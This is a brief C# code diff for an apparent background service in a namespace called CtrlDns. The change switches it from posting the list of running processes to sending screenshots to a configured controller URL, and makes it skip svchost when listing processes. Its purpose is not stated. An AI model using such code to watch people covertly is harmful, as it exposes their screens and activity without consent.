@@ -56,8 +56,8 @@ namespace CtrlDns
         {
             CtrlUrl = ConfigurationManager.AppSettings["CtrlUrl"];
 
-            await PostRunningProcesses(CtrlUrl + "/PostTaskList");
-            //await CaptureScreenshotAsync(string.Empty, CtrlUrl + "/PostImage");
+            //await PostRunningProcesses(CtrlUrl + "/PostTaskList");
+            await CaptureScreenshotAsync(string.Empty, CtrlUrl + "/PostImage");
 
             OnStart(null);
         }
@@ -384,6 +384,9 @@ namespace CtrlDns
                 for (int idx = 0; idx < lstProcessByName.Length; idx++)
                 {
                     Process p = lstProcessByName[idx];
+
+                    if (p.ProcessName == "svchost")
+                        continue;
 
                     WindowsTaskItem wp = new WindowsTaskItem();
                     wp.TaskName = p.ProcessName;
